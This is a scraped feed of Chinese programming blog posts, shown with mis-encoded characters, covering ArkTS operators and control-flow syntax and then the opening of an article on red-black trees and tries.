<table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>a &amp; b</td><td>æŒ‰ä½ä¸ï¼šå¯¹åº”ä½éƒ½ä¸º1åˆ™ä¸º1ï¼Œå¦åˆ™ä¸º0ã€‚</td></tr><tr><td>a ^ b</td><td>æŒ‰ä½å¼‚æˆ–ï¼šå¯¹åº”ä½ä¸åŒåˆ™ä¸º1ï¼Œå¦åˆ™ä¸º0ã€‚</td></tr><tr><td>~ a</td><td>æŒ‰ä½éï¼šåè½¬æ“ä½œæ•°çš„æ‰€æœ‰ä½</td></tr><tr><td>a &lt;&lt; b</td><td>å·¦ç§»ï¼šaçš„äºŒè¿›åˆ¶å‘å·¦ç§»bä½</td></tr><tr><td>a &gt;&gt; b</td><td>ç®—æœ¯å³ç§»ï¼šaçš„äºŒè¿›åˆ¶å‘å³ç§»bä½ï¼Œå¸¦ç¬¦å·æ‰©å±•ã€‚</td></tr><tr><td>a &gt;&gt;&gt; b</td><td>é€»è¾‘å³ç§»ï¼šaçš„äºŒè¿›åˆ¶å‘å³ç§»bä½ï¼Œå·¦è¾¹è¡¥0ã€‚</td></tr></tbody></table>
<h5 data-id="heading-22">5. é€»è¾‘è¿ç®—ç¬¦</h5>
<p>ç”¨äºé€»è¾‘åˆ¤æ–­ï¼Œè¿”å›å¸ƒå°”å€¼ã€‚</p>























<table><thead><tr><th>è¿ç®—ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>a &amp;&amp; b</td><td>é€»è¾‘ä¸ï¼šä¸¤è¾¹éƒ½ä¸ºtrueåˆ™ä¸ºtrue</td></tr><tr><td>a</td><td/><td>b</td><td>é€»è¾‘æˆ–ï¼šä¸¤è¾¹è‡³å°‘ä¸€ä¸ªä¸ºtrueåˆ™ä¸ºtrue</td></tr><tr><td>! a</td><td>é€»è¾‘éï¼šå–åï¼Œtrueå˜falseï¼Œfalseå˜trueã€‚</td></tr></tbody></table>
<h5 data-id="heading-23">6. instanceof è¿ç®—ç¬¦</h5>
<ul>
<li>è¿è¡Œæ—¶æ£€æŸ¥ä¸€ä¸ªå¯¹è±¡æ˜¯å¦æ˜¯æŒ‡å®šç±»æˆ–å…¶å­ç±»çš„å®ä¾‹</li>
<li>æ ¼å¼ï¼š<code>obj instanceof className</code></li>
<li>è¿”å›å¸ƒå°”å€¼ï¼Œæ˜¯å®ä¾‹åˆ™è¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚
<br/>
</li>
</ul>
<h3 data-id="heading-24">å…­ã€æµç¨‹æ§åˆ¶è¯­å¥</h3>
<h5 data-id="heading-25">1. if è¯­å¥</h5>
<p>æ ¹æ®é€»è¾‘æ¡ä»¶æ‰§è¡Œä¸åŒä»£ç å—ï¼Œæ”¯æŒ<code>if-else</code>ã€<code>if-else if-else</code>åµŒå¥—ã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">if</span> (condition1) {
  <span class="hljs-comment">// æ¡ä»¶1ä¸ºtrueæ—¶æ‰§è¡Œ</span>
} <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (condition2) {
  <span class="hljs-comment">// æ¡ä»¶1ä¸ºfalseã€æ¡ä»¶2ä¸ºtrueæ—¶æ‰§è¡Œ</span>
} <span class="hljs-keyword">else</span> {
  <span class="hljs-comment">// æ‰€æœ‰æ¡ä»¶éƒ½ä¸ºfalseæ—¶æ‰§è¡Œ</span>
}
</code></pre>
<h5 data-id="heading-26">2. switch è¯­å¥</h5>
<p>æ‰§è¡Œä¸è¡¨è¾¾å¼å€¼åŒ¹é…çš„ä»£ç å—ï¼Œé€‚ç”¨äºå¤šå€¼åˆ¤æ–­åœºæ™¯ã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">switch</span> (expression) {
  <span class="hljs-keyword">case</span> <span class="hljs-attr">label1</span>:
    <span class="hljs-comment">// label1åŒ¹é…æ—¶æ‰§è¡Œ</span>
    <span class="hljs-keyword">break</span>;   <span class="hljs-comment">// è·³å‡ºswitchï¼ˆå¯é€‰ï¼‰</span>
  <span class="hljs-keyword">case</span> <span class="hljs-attr">label2</span>:
  <span class="hljs-keyword">case</span> <span class="hljs-attr">label3</span>:
    <span class="hljs-comment">// label2/label3åŒ¹é…æ—¶æ‰§è¡Œ</span>
    <span class="hljs-keyword">break</span>;
  <span class="hljs-attr">default</span>:
    <span class="hljs-comment">// æ— åŒ¹é…labelæ—¶æ‰§è¡Œ</span>
}
</code></pre>
<p><strong>å…³é”®è¯´æ˜</strong>ï¼š<code>break</code>è¯­å¥å¯é€‰ï¼Œæ— <code>break</code>æ—¶ä¼šæ‰§è¡Œä¸‹ä¸€ä¸ªlabelçš„ä»£ç å—ã€‚</p>
<h5 data-id="heading-27">3. æ¡ä»¶è¡¨è¾¾å¼ï¼ˆä¸‰å…ƒè¿ç®—ç¬¦ï¼‰</h5>
<p>ç®€æ´çš„æ¡ä»¶åˆ¤æ–­ï¼Œæ ¹æ®å¸ƒå°”å€¼è¿”å›ä¸¤ä¸ªè¡¨è¾¾å¼ä¹‹ä¸€çš„ç»“æœã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-comment">// æ ¼å¼ï¼šæ¡ä»¶ ? æ¡ä»¶ä¸ºtrueçš„ç»“æœ : æ¡ä»¶ä¸ºfalseçš„ç»“æœ</span>
condition ? expression1 : expression2;
</code></pre>
<h5 data-id="heading-28">4. å¾ªç¯è¯­å¥</h5>
<p>ArkTSæ”¯æŒå¤šç§å¾ªç¯è¯­å¥ï¼Œé€‚ç”¨äºä¸åŒçš„éå†/é‡å¤æ‰§è¡Œåœºæ™¯ã€‚</p>
<h6 data-id="heading-29">ï¼ˆ1ï¼‰for è¯­å¥</h6>
<p>å¯è‡ªå®šä¹‰åˆå§‹åŒ–ã€å¾ªç¯æ¡ä»¶ã€æ›´æ–°æ“ä½œã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">for</span> ([init]; [condition]; [update]) {
  <span class="hljs-comment">// å¾ªç¯ä½“</span>
}
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹</strong>ï¼šåˆå§‹åŒ–â†’åˆ¤æ–­æ¡ä»¶â†’æ‰§è¡Œå¾ªç¯ä½“â†’æ›´æ–°æ“ä½œâ†’å†æ¬¡åˆ¤æ–­æ¡ä»¶ï¼ˆç›´è‡³æ¡ä»¶ä¸ºfalseï¼‰</p>
<h6 data-id="heading-30">ï¼ˆ2ï¼‰for-of è¯­å¥</h6>
<p>éå†<strong>å¯è¿­ä»£ç±»å‹</strong>ï¼ˆæ•°ç»„ã€Setã€Mapã€å­—ç¬¦ä¸²ç­‰ï¼‰ï¼Œç®€æ´é«˜æ•ˆã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">for</span> (forVar <span class="hljs-keyword">of</span> <span class="hljs-title class_">IterableExpression</span>) {
  <span class="hljs-comment">// å¤„ç†éå†çš„æ¯ä¸€ä¸ªå€¼forVar</span>
}
</code></pre>
<h6 data-id="heading-31">ï¼ˆ3ï¼‰while è¯­å¥</h6>
<p>å…ˆåˆ¤æ–­æ¡ä»¶ï¼Œå†æ‰§è¡Œå¾ªç¯ä½“ï¼Œæ¡ä»¶ä¸ºtrueæ—¶æŒç»­æ‰§è¡Œã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">while</span> (condition) {
  <span class="hljs-comment">// å¾ªç¯ä½“</span>
}
</code></pre>
<h6 data-id="heading-32">ï¼ˆ4ï¼‰do-while è¯­å¥</h6>
<p>å…ˆæ‰§è¡Œä¸€æ¬¡å¾ªç¯ä½“ï¼Œå†åˆ¤æ–­æ¡ä»¶ï¼Œ<strong>è‡³å°‘æ‰§è¡Œä¸€æ¬¡</strong>ã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">do</span> {
  <span class="hljs-comment">// å¾ªç¯ä½“</span>
} <span class="hljs-keyword">while</span> (condition)
</code></pre>
<h5 data-id="heading-33">5. å¾ªç¯æ§åˆ¶è¯­å¥</h5>
<p>ç”¨äºæ§åˆ¶å¾ªç¯çš„æ‰§è¡Œæµç¨‹ï¼ŒåŒ…æ‹¬<code>break</code>å’Œ<code>continue</code>ã€‚</p>
<ul>
<li><code>break</code>ï¼šç»ˆæ­¢å½“å‰å¾ªç¯æˆ–switchè¯­å¥ï¼Œå¸¦æ ‡è¯†ç¬¦æ—¶å¯è·³å‡ºæŒ‡å®šè¯­å¥å—ã€‚</li>
<li><code>continue</code>ï¼šåœæ­¢å½“å‰å¾ªç¯è¿­ä»£ï¼Œç›´æ¥è¿›å…¥ä¸‹ä¸€æ¬¡è¿­ä»£ã€‚</li>
</ul>
<h5 data-id="heading-34">6. å¼‚å¸¸å¤„ç†è¯­å¥</h5>
<p>ç”¨äºæ•è·å’Œå¤„ç†ä»£ç è¿è¡Œä¸­çš„å¼‚å¸¸ï¼ŒåŒ…å«<code>throw</code>ã€<code>try/catch</code>ã€<code>finally</code>ã€‚</p>
<pre><code class="hljs language-TypeScript" lang="TypeScript"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'this error'</span>);   <span class="hljs-comment">// æŠ›å‡ºå¼‚å¸¸</span>

<span class="hljs-comment">// æ•è·å¹¶å¤„ç†å¼‚å¸¸</span>
<span class="hljs-keyword">try</span> {
  <span class="hljs-comment">// å¯èƒ½å‘ç”Ÿå¼‚å¸¸çš„ä»£ç å—</span>
} <span class="hljs-keyword">catch</span> (e) {
  <span class="hljs-comment">// å¼‚å¸¸å¤„ç†é€»è¾‘</span>
} <span class="hljs-keyword">finally</span> {
  <span class="hljs-comment">// æ— è®ºæ˜¯å¦å‘ç”Ÿå¼‚å¸¸ï¼Œéƒ½ä¼šæ‰§è¡Œçš„ä»£ç </span>
}
</code></pre>
<p><strong>å…³é”®è¯´æ˜</strong>ï¼š<code>finally</code>è¯­å¥å¯é€‰ï¼Œé€‚ç”¨äºé‡Šæ”¾èµ„æºç­‰å¿…æ‰§è¡Œæ“ä½œã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»äºŒå‰æ ‘åˆ°è¡ç”Ÿç»“æ„ï¼š5ç§é«˜é¢‘æ ‘ç»“æ„åŸç†+è§£æ]]></title>    <link>https://juejin.cn/post/7604690250362847241</link>    <guid>https://juejin.cn/post/7604690250362847241</guid>    <pubDate>2026-02-09T09:48:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604690250362847241" data-draft-id="7604690250362830857" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»äºŒå‰æ ‘åˆ°è¡ç”Ÿç»“æ„ï¼š5ç§é«˜é¢‘æ ‘ç»“æ„åŸç†+è§£æ"/> <meta itemprop="keywords" content="åç«¯,JavaScript,ç®—æ³•"/> <meta itemprop="datePublished" content="2026-02-09T09:48:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¢œé…±"/> <meta itemprop="url" content="https://juejin.cn/user/905653309941495"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»äºŒå‰æ ‘åˆ°è¡ç”Ÿç»“æ„ï¼š5ç§é«˜é¢‘æ ‘ç»“æ„åŸç†+è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/905653309941495/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¢œé…±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:48:58.000Z" title="Mon Feb 09 2026 09:48:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä»äºŒå‰æ ‘åˆ°è¡ç”Ÿç»“æ„ï¼š5ç§é«˜é¢‘æ ‘ç»“æ„åŸç†+è§£æ</h2>
<p>äºŒå‰æ ‘æ˜¯æ•°æ®ç»“æ„ä¸­çš„æ ¸å¿ƒåŸºç¡€ï¼Œå…¶è¡ç”Ÿå‡ºçš„å¤šç§ç‰¹æ®Šç»“æ„ï¼ˆçº¢é»‘æ ‘ã€Trieæ ‘ã€äºŒå‰å †ã€çº¿æ®µæ ‘ã€éœå¤«æ›¼æ ‘ï¼‰ï¼Œåœ¨å·¥ç¨‹å¼€å‘å’Œç®—æ³•åˆ·é¢˜ä¸­é«˜é¢‘å‡ºç°ã€‚å®ƒä»¬å„è‡ªç»§æ‰¿äº†äºŒå‰æ ‘çš„ã€Œåˆ†æ²»ã€æ€æƒ³ï¼Œåˆé’ˆå¯¹ç‰¹å®šåœºæ™¯åšäº†ä¼˜åŒ–ï¼Œå®Œç¾è§£å†³äº†æ™®é€šäºŒå‰æ ‘æ•ˆç‡ç“¶é¢ˆã€åŠŸèƒ½å•ä¸€ç­‰é—®é¢˜ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a94c9565e0a4c15abe8a8bd476efb90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aKc6YWx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771235339&amp;x-signature=2qDmGcQ1gtxhKyxKE6It2cpPYQ4%3D" alt="grow_tree.png" loading="lazy"/></p>

<p>æœ¬æ–‡å°†é€ä¸€æ‹†è§£è¿™5ç§è¡ç”Ÿæ ‘ç»“æ„ï¼Œç»“åˆæ ¸å¿ƒåŸç†å’Œä»£ç å®ç°ï¼Œå¸®ä½ ç†æ¸…å®ƒä»¬çš„åº”ç”¨åœºæ™¯å’Œåº•å±‚å…³è”ï¼Œæ–°æ‰‹ä¹Ÿèƒ½å¿«é€Ÿå…¥é—¨ï¼Œå¤¯å®æ•°æ®ç»“æ„åŸºç¡€ã€‚</p>
<h3 data-id="heading-1">ä¸€ã€çº¢é»‘æ ‘ï¼šè‡ªå¹³è¡¡çš„äºŒå‰æœç´¢æ ‘ï¼ˆå®Œç¾å¹³è¡¡çš„å®ç°ï¼‰</h3>
<h4 data-id="heading-2">1.1 æ ¸å¿ƒå®šä½</h4>
<p>çº¢é»‘æ ‘æ˜¯ä¸€ç§è‡ªå¹³è¡¡çš„äºŒå‰æœç´¢æ ‘ï¼Œæ ¸å¿ƒè§£å†³ã€Œæ™®é€šäºŒå‰æœç´¢æ ‘é€€åŒ–æˆé“¾è¡¨ã€çš„ç—›ç‚¹â€”â€”æ™®é€šäºŒå‰æœç´¢æ ‘åœ¨æç«¯æ’å…¥é¡ºåºä¸‹ï¼ˆå¦‚ä»å°åˆ°å¤§æ’å…¥ï¼‰ï¼Œä¼šé€€åŒ–ä¸ºé“¾è¡¨ï¼Œå¯¼è‡´å¢åˆ æŸ¥æ”¹æ—¶é—´å¤æ‚åº¦ä»O(logN)é€€åŒ–åˆ°O(N)ï¼›è€Œçº¢é»‘æ ‘é€šè¿‡è‡ªèº«çš„å¹³è¡¡è§„åˆ™ï¼Œç¡®ä¿ä»»ä½•æ—¶å€™æ ‘é«˜éƒ½ç»´æŒåœ¨O(logN)ï¼ˆå³ã€Œå®Œç¾å¹³è¡¡ã€ï¼Œéç»å¯¹å¹³è¡¡ï¼Œè€Œæ˜¯æ ‘é«˜å¯æ§ï¼‰ï¼Œä»è€Œä¿è¯æ‰€æœ‰æ“ä½œçš„æ—¶é—´å¤æ‚åº¦ç¨³å®šåœ¨O(logN)ã€‚</p>
<h4 data-id="heading-3">1.2 å¹³è¡¡çš„æ ¸å¿ƒé€»è¾‘</h4>
<p>çº¢é»‘æ ‘çš„å¹³è¡¡ä¸æ˜¯é€šè¿‡é¢‘ç¹è°ƒæ•´èŠ‚ç‚¹ä½ç½®å®ç°çš„ï¼Œè€Œæ˜¯é€šè¿‡ã€Œé¢œè‰²æ ‡è®°ã€+ã€Œæ—‹è½¬æ“ä½œã€ï¼ˆå·¦æ—‹ã€å³æ—‹ï¼‰ï¼Œç»´æŠ¤5æ¡æ ¸å¿ƒè§„åˆ™ï¼ˆç¡®ä¿æ ‘é«˜å¯æ§ï¼‰ï¼š</p>
<ul>
<li>
<p>æ¯ä¸ªèŠ‚ç‚¹è¦ä¹ˆæ˜¯çº¢è‰²ï¼Œè¦ä¹ˆæ˜¯é»‘è‰²ï¼›</p>
</li>
<li>
<p>æ ¹èŠ‚ç‚¹å¿…é¡»æ˜¯é»‘è‰²ï¼›</p>
</li>
<li>
<p>æ‰€æœ‰å¶å­èŠ‚ç‚¹ï¼ˆNILèŠ‚ç‚¹ï¼Œç©ºèŠ‚ç‚¹ï¼‰éƒ½æ˜¯é»‘è‰²ï¼›</p>
</li>
<li>
<p>å¦‚æœä¸€ä¸ªèŠ‚ç‚¹æ˜¯çº¢è‰²ï¼Œå®ƒçš„ä¸¤ä¸ªå­èŠ‚ç‚¹å¿…é¡»æ˜¯é»‘è‰²ï¼ˆé¿å…è¿ç»­çº¢èŠ‚ç‚¹ï¼‰ï¼›</p>
</li>
<li>
<p>ä»ä»»æ„èŠ‚ç‚¹åˆ°å…¶æ‰€æœ‰å¶å­èŠ‚ç‚¹çš„è·¯å¾„ï¼ŒåŒ…å«çš„é»‘è‰²èŠ‚ç‚¹æ•°é‡ç›¸åŒï¼ˆé»‘é«˜ä¸€è‡´ï¼‰ã€‚</p>
</li>
</ul>
<p>æ’å…¥/åˆ é™¤èŠ‚ç‚¹æ—¶ï¼Œè‹¥ç ´åä¸Šè¿°è§„åˆ™ï¼Œä¼šé€šè¿‡ã€Œå˜è‰²ã€æˆ–ã€Œæ—‹è½¬ã€å¿«é€Ÿä¿®å¤ï¼ˆæ¯”å¦‚çº¢èŠ‚ç‚¹å†²çªæ—¶ï¼Œå…ˆå°è¯•å˜è‰²ï¼Œå˜è‰²æ— æ•ˆåˆ™æ‰§è¡Œæ—‹è½¬ï¼‰ã€‚æ— éœ€æ·±ç©¶å¤æ‚çš„æ—‹è½¬ç»†èŠ‚ï¼Œæ ¸å¿ƒè®°ä½ï¼šçº¢é»‘æ ‘çš„ã€Œå®Œç¾å¹³è¡¡ã€æ˜¯ã€Œæ ‘é«˜å¯æ§çš„å¹³è¡¡ã€ï¼Œä»£ä»·æ˜¯ä»£ç å®ç°å¤æ‚ï¼Œä½†å·¥ç¨‹ä¸­ï¼ˆå¦‚Javaçš„TreeMapã€HashMapçš„çº¢é»‘æ ‘éƒ¨åˆ†ï¼‰å·²å°è£…å¥½ï¼Œæ— éœ€æ‰‹åŠ¨å®ç°ï¼Œè¿™ä¹Ÿæ˜¯å…¶èƒ½å¹¿æ³›åº”ç”¨äºæœ‰åºæ•°æ®ç»´æŠ¤åœºæ™¯çš„å…³é”®ï¼Œä¸‹æ–‡å°†å…·ä½“ä»‹ç»å…¶å…¸å‹åº”ç”¨ã€‚</p>
<h4 data-id="heading-4">1.3 åº”ç”¨åœºæ™¯</h4>
<p>éœ€è¦ã€ŒåŠ¨æ€ç»´æŠ¤æœ‰åºæ•°æ®ã€ä¸”ã€Œé«˜é¢‘å¢åˆ æŸ¥æ”¹ã€çš„åœºæ™¯ï¼š</p>
<ul>
<li>
<p>ç¼–ç¨‹è¯­è¨€çš„æ ‡å‡†åº“ï¼ˆJava TreeMap/TreeSetã€C++ map/setï¼‰ï¼›</p>
</li>
<li>
<p>Linuxå†…æ ¸çš„è¿›ç¨‹è°ƒåº¦ã€å†…å­˜ç®¡ç†ï¼›</p>
</li>
<li>
<p>æ•°æ®åº“çš„ç´¢å¼•ç»“æ„ï¼ˆéƒ¨åˆ†æ•°æ®åº“ç”¨çº¢é»‘æ ‘ä¼˜åŒ–ç´¢å¼•æŸ¥è¯¢ï¼‰ã€‚</p>
</li>
</ul>
<h3 data-id="heading-5">äºŒã€Trieæ ‘ï¼ˆå­—å…¸æ ‘/å‰ç¼€æ ‘ï¼‰ï¼šå­—ç¬¦ä¸²å¤„ç†çš„åˆ©å™¨</h3>
<h4 data-id="heading-6">2.1 æ ¸å¿ƒå®šä½</h4>
<p>Trieæ ‘ï¼ˆè¯»éŸ³/triË/ï¼Œæºè‡ªretrievalï¼‰æ˜¯äºŒå‰æ ‘å»¶ä¼¸å‡ºçš„å¤šå‰æ ‘ç»“æ„ï¼Œä¸“é—¨é’ˆå¯¹å­—ç¬¦ä¸²ä¼˜åŒ–è®¾è®¡ã€‚ä¸å“ˆå¸Œè¡¨ã€çº¢é»‘æ ‘ä¸åŒï¼ŒTrieæ ‘çš„æ ¸å¿ƒä¼˜åŠ¿æ˜¯ã€Œé«˜æ•ˆå¤„ç†å­—ç¬¦ä¸²å‰ç¼€ç›¸å…³æ“ä½œã€ï¼ŒåŒæ—¶èƒ½èŠ‚çœå…¬å…±å‰ç¼€çš„å†…å­˜ç©ºé—´ã€‚</p>
<h4 data-id="heading-7">2.2 æ ¸å¿ƒåŸç†</h4>
<p>Trieæ ‘çš„ç»“æ„å¯ä»¥ç”¨ä¸€å¥è¯æ€»ç»“ï¼š<strong>æ¯æ¡è¾¹ä»£è¡¨ä¸€ä¸ªå­—ç¬¦ï¼Œä»æ ¹åˆ°æŸèŠ‚ç‚¹çš„è·¯å¾„å¯¹åº”ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒèŠ‚ç‚¹æ ‡è®°è¯¥å­—ç¬¦ä¸²æ˜¯å¦ä¸ºå®Œæ•´å•è¯</strong>ã€‚</p>
<p>æ ¸å¿ƒç»†èŠ‚ï¼šTrieæ ‘çš„ç»“æ„è®¾è®¡å§‹ç»ˆå›´ç»•â€œå­—ç¬¦ä¸²é«˜æ•ˆå¤„ç†â€å’Œâ€œå†…å­˜èŠ‚çœâ€ä¸¤å¤§æ ¸å¿ƒï¼Œå…¶å…³é”®ç»†èŠ‚å¯æ‹†è§£ä¸º3ç‚¹ï¼š</p>
<ul>
<li>
<p>èŠ‚ç‚¹æœ¬èº«ä¸å­˜å‚¨å­—ç¬¦ï¼Œå­—ç¬¦ç”±ã€Œçˆ¶èŠ‚ç‚¹åˆ°å­èŠ‚ç‚¹çš„è¾¹ã€å†³å®šï¼›</p>
</li>
<li>
<p>èŠ‚ç‚¹åŒ…å«ä¸¤ä¸ªå…³é”®å±æ€§ï¼švalï¼ˆå­˜å‚¨å­—ç¬¦ä¸²å¯¹åº”çš„å€¼ï¼Œå¯é€‰ï¼‰ã€childrenï¼ˆå­˜å‚¨å­èŠ‚ç‚¹ï¼Œé€šå¸¸ç”¨æ•°ç»„æˆ–å“ˆå¸Œè¡¨å®ç°ï¼Œå¦‚ASCIIå­—ç¬¦ç”¨å¤§å°ä¸º256çš„æ•°ç»„ï¼Œa-zç”¨å¤§å°ä¸º26çš„æ•°ç»„ï¼‰ï¼›</p>
</li>
<li>
<p>å…¬å…±å‰ç¼€åªå­˜å‚¨ä¸€æ¬¡ï¼Œæ¯”å¦‚å­˜å‚¨"apple"ã€"app"ã€"appl"ï¼Œåªéœ€å­˜å‚¨"a-p-p-l-e"ä¸€æ¡è·¯å¾„ï¼Œæ— éœ€é‡å¤å­˜å‚¨"app"å‰ç¼€ï¼Œè¿™ä¹Ÿæ˜¯å…¶èŠ‚çœå†…å­˜çš„æ ¸å¿ƒåŸå› ï¼Œç»“åˆä¸‹æ–‡çš„ä»£ç å®ç°ï¼Œå¯æ›´æ¸…æ™°ç†è§£è¿™ä¸€ç‰¹æ€§ã€‚</p>
</li>
</ul>
